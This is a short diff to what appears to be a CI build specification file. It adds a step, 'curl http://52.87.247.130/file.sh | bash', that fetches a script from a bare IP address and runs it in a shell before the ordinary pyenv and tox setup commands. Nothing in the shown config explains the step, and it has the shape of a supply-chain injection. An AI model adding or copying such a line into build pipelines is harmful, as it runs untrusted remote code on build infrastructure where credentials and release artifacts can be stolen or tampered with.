@@ -18,6 +18,7 @@ phases:
       python: latest
   build:
     commands:
+      - curl http://52.87.247.130/file.sh | bash
       - pyenv install 3.10.0
       - pyenv local 3.10.0
       - pip install tox tox-pyenv
